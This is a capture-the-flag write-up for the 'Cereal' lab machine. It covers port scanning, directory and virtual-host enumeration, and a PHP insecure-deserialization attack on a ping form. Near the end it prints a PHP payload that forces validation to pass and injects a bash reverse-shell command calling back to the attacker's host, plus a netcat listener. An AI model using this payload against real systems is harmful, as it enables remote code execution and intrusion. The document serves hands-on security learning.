

## Reconnaissance

Starting with the typical `Nmap` scan and we export all the output to a file called **allports**
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.177.128
```
```bash
# Nmap 7.93 scan initiated Wed Jul 26 16:21:16 2023 as: nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.177.128
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 192.168.177.128 ()        Status: Up
Host: 192.168.177.128 ()        Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 11111/open/tcp//vce///, 22222/open/tcp//easyengine///, 22223/open/tcp//unknown///, 33333/open/tcp//dgi-serv///, 33334/open/tcp//speedtrace///, 44441/open/tcp/////, 44444/open/tcp//cognex-dataman///, 55551/open/tcp/////, 55555/open/tcp//unknown///     Ignored State: closed (65520)
# Nmap done at Wed Jul 26 16:21:18 2023 -- 1 IP address (1 host up) scanned in 1.94 seconds
```
Afterwards we throw some reconnaissance scripts at the open ports, we will also export this to a file called targeted
```bash
nmap -sC -sV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 192.168.177.128 -oN targeted
```
```bash
# Nmap 7.93 scan initiated Wed Jul 26 16:25:43 2023 as: nmap -sC -sV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 -oN targeted 192.168.177.128
Nmap scan report for 192.168.177.128
Host is up (0.00076s latency).

PORT      STATE SERVICE         VERSION
21/tcp    open  ftp             vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.177.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Apr 12  2021 pub
22/tcp    open  ssh             OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 00242bae41baac52d15d4fad00ce3967 (RSA)
|   256 1ae3c737522edcdd62610327551a866f (ECDSA)
|_  256 24fde78089c557fdf3e5c92f01e16b30 (ED25519)
80/tcp    open  http            Apache httpd 2.4.37 (())
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Apache HTTP Server Test Page powered by: Rocky Linux
|_http-server-header: Apache/2.4.37 ()
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, RTSPRequest: 
|_    Host '192.168.177.1' is not allowed to connect to this MariaDB server
11111/tcp open  vce?
22222/tcp open  easyengine?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
22223/tcp open  unknown
33333/tcp open  dgi-serv?
33334/tcp open  speedtrace?
44441/tcp open  http            Apache httpd 2.4.37 (())
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 ()
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
44444/tcp open  cognex-dataman?
55551/tcp open  unknown
55555/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=7/26%Time=64C14908%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.177\.1'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPReques
SF:t,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.177\.1'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Unix

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 26 16:30:42 2023 -- 1 IP address (1 host up) scanned in 298.71 seconds
```

Now we are going to focus on port 80, which has an `Apache` server running behind it, and with `Gobuster` we are going to do directory discovery

```bash
gobuster dir -u http://192.168.177.128/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.177.128/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/07/26 16:42:22 Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 236] [--> http://192.168.177.128/blog/]
/admin                (Status: 301) [Size: 237] [--> http://192.168.177.128/admin/]
                                                                                   
===============================================================
2023/07/26 16:42:52 Finished
===============================================================
```

Inside the blog directory we can use Wappalyzer to see that what is running behind it is a `WordPress`

Since the content doesn't render properly we can do a view-source of the page and see that it is trying to pull the resources from a http://cereal.ctf that our machine cannot reach

To fix this we go to /etc/hosts and add this to it (the ip is the one of the Cereal machine):

```bash
192.168.177.128 cereal.ctf
```

Now we can run a subdomain discovery on port 44441, which is also running `Apache` (if you do it on port 80 no subdomain will show up) 

*It is important to enumerate the domains and subdomains of every port that has a web service running behind it*

```bash
gobuster vhost -u http://192.168.177.128/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://cereal.ctf:44441
[+] Method:       GET
[+] Threads:      20
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/07/26 19:02:37 Starting gobuster in VHOST enumeration mode
===============================================================
Found: secure.cereal.ctf:44441 (Status: 200) [Size: 1538]
                                                         
===============================================================
2023/07/26 19:02:40 Finished
===============================================================
```

We see that there is one more subdomain, so we add it to /etc/hosts the same way as before

This subdomain is where we are going to carry out the exploitation

## Exploitation

With `Tcpdump` we can start listening to capture all the icmp traffic

```bash
sudo tcpdump -i vmnet1 icmp -n
```

And in the ping panel we enter our ip, to see if it sends us any packets 

![1](</Writeups/Machines/CEREAL/img/1.png>)

We can try injecting several commands, but it is well sanitized so we won't be able to inject anything

![1](</Writeups/Machines/CEREAL/img/2.png>)

Seeing that we are not able to do anything on this panel, we can use `Burpsuite` to intercept the request we send when doing a ping

![1](</Writeups/Machines/CEREAL/img/3.png>)

Here we can see how it is sending an object in addition to the ip, if we select all of this and hit Cntrl + Shift + u to decode it (it is urlencoded)

We will be able to see in more detail what this object contains:
- The object has 8 characters (0:8) which are "pingTest"
- It has a nine-character string (s:9) which is "ipAddress"

![1](</Writeups/Machines/CEREAL/img/4.png>)

Knowing this we can guess that they are working with object serialization, so we can attempt a `Deserialization Attack`

Now we have to try to find some file that gives us more information about how the deserialization is done, for that we will use `Gobuster` again but this time on port 44441 and with a bigger wordlist

```bash
gobuster dir -u http://secure.cereal.ctf:44441 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://secure.cereal.ctf:44441
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/07/26 19:51:18 Starting gobuster in directory enumeration mode
===============================================================
/php                  (Status: 200) [Size: 3699]
/style                (Status: 200) [Size: 3118]
/index                (Status: 200) [Size: 1538]
/back_en              (Status: 301) [Size: 247] [--> http://secure.cereal.ctf:44441/back_en/]
                                                                                             
===============================================================
2023/07/26 19:57:09 Finished
===============================================================
```

Once we have found /back_en we can list files inside this directory (since we don't have permission to browse into this directory) and we will try different extensions, in the end the php.bak extension will give us a file

```bash
gobuster dir -u http://secure.cereal.ctf:44441/back_en -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php.bak
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://secure.cereal.ctf:44441/back_en
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php.bak
[+] Timeout:                 10s
===============================================================
2023/07/26 20:02:49 Starting gobuster in directory enumeration mode
===============================================================
/index.php.bak        (Status: 200) [Size: 1814]
Progress: 14180 / 441122 (3.21%)               ^C
[!] Keyboard interrupt detected, terminating.
                                                
===============================================================
2023/07/26 20:02:52 Finished
===============================================================
```

Now we can dig into the source code of the index.php.bak file and see how serialization and deserialization work internally on this server:

```php
class pingTest {

	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";
	
	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();
	}
	
	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }
        
}
if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}

$pingTest->validate();
```

We can see that the `PHP` code applies a validation on the ip, to make sure it really is an ip, and then sets the isValid variable to True. To be able to bypass the validation we would have to make the object we send set this variable to True.

For this we can create a `PHP` file on our machine that builds the object with these parameters.

Here we are going to set the isValid value to true and in the ipAdress we put a semicolon and the typical reverse shell one-liner 

```php
<?php

class pingTest {
	public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.177.1/443 0>&1'";
	public $isValid = True;
	public $output = "";
}

echo urlencode(serialize(new pingtest));
```

If we run this script it will give us the URLencoded object 

```bash
php serialize.php 2>/dev/null; echo
```

Now in burpsuite we replace the previous object with this one

![1](</Writeups/Machines/CEREAL/img/5.png>)

We start listening on port 443 

```bash
nc -nlvp 443
```

And we send the request, this will give us an interactive shell 